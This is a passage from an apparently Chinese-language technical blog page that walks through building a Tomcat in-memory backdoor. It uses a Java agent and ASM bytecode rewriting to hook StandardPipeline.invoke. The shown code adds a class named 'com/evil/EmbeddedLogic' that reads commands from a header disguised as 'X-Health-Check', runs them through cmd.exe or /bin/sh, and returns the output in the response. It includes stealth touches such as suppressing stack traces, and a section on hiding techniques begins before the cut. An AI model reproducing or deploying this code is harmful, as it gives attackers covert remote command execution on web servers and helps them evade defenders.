</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                               </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">classBeingRedefined</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                               </span><span class="n">ProtectionDomain</span><span class="w"> </span><span class="n">protectionDomain</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                               </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classfileBuffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">dotClassName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">TARGET_CLASSES</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">dotClassName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">modifyClass</span><span class="p">(</span><span class="n">dotClassName</span><span class="p">,</span><span class="w"> </span><span class="n">classfileBuffer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="二字节码修改技术asm核心实现">二、字节码修改技术（ASM核心实现）<a hidden class="anchor" aria-hidden="true" href="#二字节码修改技术asm核心实现">#</a></h3>
<p><strong>1. StandardPipeline类修改</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
</span><span class="lnt" id="36"><a class="lnlinks" href="#36">36</a>
</span><span class="lnt" id="37"><a class="lnlinks" href="#37">37</a>
</span><span class="lnt" id="38"><a class="lnlinks" href="#38">38</a>
</span><span class="lnt" id="39"><a class="lnlinks" href="#39">39</a>
</span><span class="lnt" id="40"><a class="lnlinks" href="#40">40</a>
</span><span class="lnt" id="41"><a class="lnlinks" href="#41">41</a>
</span><span class="lnt" id="42"><a class="lnlinks" href="#42">42</a>
</span><span class="lnt" id="43"><a class="lnlinks" href="#43">43</a>
</span><span class="lnt" id="44"><a class="lnlinks" href="#44">44</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">modifyStandardPipeline</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">origBytecode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ClassReader</span><span class="w"> </span><span class="n">cr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClassReader</span><span class="p">(</span><span class="n">origBytecode</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ClassWriter</span><span class="w"> </span><span class="n">cw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ClassWriter</span><span class="p">(</span><span class="n">cr</span><span class="p">,</span><span class="w"> </span><span class="n">ClassWriter</span><span class="p">.</span><span class="na">COMPUTE_FRAMES</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">cr</span><span class="p">.</span><span class="na">accept</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClassVisitor</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ASM9</span><span class="p">,</span><span class="w"> </span><span class="n">cw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">MethodVisitor</span><span class="w"> </span><span class="nf">visitMethod</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                        </span><span class="n">String</span><span class="w"> </span><span class="n">desc</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">exceptions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">MethodVisitor</span><span class="w"> </span><span class="n">mv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">visitMethod</span><span class="p">(</span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">desc</span><span class="p">,</span><span class="w"> </span><span class="n">signature</span><span class="p">,</span><span class="w"> </span><span class="n">exceptions</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 在invoke方法中植入钩子</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">desc</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MethodVisitor</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ASM9</span><span class="p">,</span><span class="w"> </span><span class="n">mv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">visitCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="c1">// 在方法开始处插入检测逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">mv</span><span class="p">.</span><span class="na">visitVarInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">ALOAD</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// 加载Request</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">mv</span><span class="p">.</span><span class="na">visitMethodInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">INVOKESTATIC</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                          </span><span class="s">&#34;com/evil/EmbeddedLogic&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                          </span><span class="s">&#34;checkRequest&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                          </span><span class="s">&#34;(Lorg/apache/catalina/connector/Request;)Z&#34;</span><span class="p">,</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">                                          </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">Label</span><span class="w"> </span><span class="n">skipLabel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Label</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">mv</span><span class="p">.</span><span class="na">visitJumpInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">IFEQ</span><span class="p">,</span><span class="w"> </span><span class="n">skipLabel</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="c1">// 如果是恶意请求，直接返回</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">mv</span><span class="p">.</span><span class="na">visitInsn</span><span class="p">(</span><span class="n">Opcodes</span><span class="p">.</span><span class="na">RETURN</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">mv</span><span class="p">.</span><span class="na">visitLabel</span><span class="p">(</span><span class="n">skipLabel</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="kd">super</span><span class="p">.</span><span class="na">visitCode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">mv</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">cw</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>2. 嵌入式恶意逻辑类</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span><span class="lnt" id="26"><a class="lnlinks" href="#26">26</a>
</span><span class="lnt" id="27"><a class="lnlinks" href="#27">27</a>
</span><span class="lnt" id="28"><a class="lnlinks" href="#28">28</a>
</span><span class="lnt" id="29"><a class="lnlinks" href="#29">29</a>
</span><span class="lnt" id="30"><a class="lnlinks" href="#30">30</a>
</span><span class="lnt" id="31"><a class="lnlinks" href="#31">31</a>
</span><span class="lnt" id="32"><a class="lnlinks" href="#32">32</a>
</span><span class="lnt" id="33"><a class="lnlinks" href="#33">33</a>
</span><span class="lnt" id="34"><a class="lnlinks" href="#34">34</a>
</span><span class="lnt" id="35"><a class="lnlinks" href="#35">35</a>
</span><span class="lnt" id="36"><a class="lnlinks" href="#36">36</a>
</span><span class="lnt" id="37"><a class="lnlinks" href="#37">37</a>
</span><span class="lnt" id="38"><a class="lnlinks" href="#38">38</a>
</span><span class="lnt" id="39"><a class="lnlinks" href="#39">39</a>
</span><span class="lnt" id="40"><a class="lnlinks" href="#40">40</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EmbeddedLogic</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 请求检测逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkRequest</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">trigger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&#34;X-Health-Check&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">trigger</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">trigger</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&#34;v1-&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">trigger</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">executeCommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getResponse</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 命令执行逻辑（多平台兼容）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">executeCommand</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">commands</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">).</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">commands</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">commands</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">commands</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                 </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">// 流式传输结果</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">4096</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">bytesRead</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">bytesRead</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">bytesRead</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 错误处理（不留栈轨迹）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;ERROR: Command execution failed&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="三隐蔽性增强技术">三、隐蔽性增强技术<a hidden class="anchor" aria-hidden="true" href="#三隐蔽性增强技术">#</a></h3>
<p><strong>1. 幽灵Valve技术</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
